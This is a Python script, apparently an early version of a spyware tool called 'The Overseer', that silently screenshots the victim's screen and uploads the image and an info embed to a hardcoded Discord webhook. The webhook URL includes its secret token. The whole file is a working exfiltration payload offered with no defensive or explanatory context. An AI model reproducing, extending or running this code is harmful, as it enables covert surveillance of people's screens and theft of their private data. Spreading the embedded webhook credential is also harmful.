import requests
import pyautogui

def take_ss():
    image = pyautogui.screenshot()
    screenshot_path = "Jus_some_random_shi.png"
    image.save(screenshot_path)
    return screenshot_path

def send_to_webhook():
    baseurl = "https://discord.com/api/webhooks/1319825974728196237/ZZPp-0LhJFDHLCS0X5ndbwQ3M0lESapRacD7YiW66bEZ2S63CU2N1PjhLVEA8rP5uPzh"

    screenshot_path = take_ss()
    
    data = {
        "embeds": [
            {
                "title": "The Overseer's info",
                "color": 5639644,
                "fields": [
                    {
                        "name": "Process",
                        "value": ""
                    }
                ],
                "footer":{
                    "text": "The Overseer 0.0.0.4 | Created by The Magic Man"}
            }
        ],
        "username": "The Overseer"
    }
    try:
        response = requests.post(baseurl, json=data)
        if response.status_code == 204:
            print("Message sent to webhook")
        else:
            print(f"Failed to send message: {response.status_code} - {response.text}")
    except requests.exceptions.RequestException as e:
            print(f"Error occured: {e}")
        
    with open(screenshot_path, "rb") as file:
        files = {
            "file": file
        }

        try:
            response = requests.post(baseurl, files=files)
            if response.status_code == 204:
                print("Message sent to webhook")
            else:
                print(f"Failed to send message: {response.status_code} - {response.text}")
        except requests.exceptions.RequestException as e:
            print(f"Error occured: {e}")

if __name__ == "__main__":
    send_to_webhook()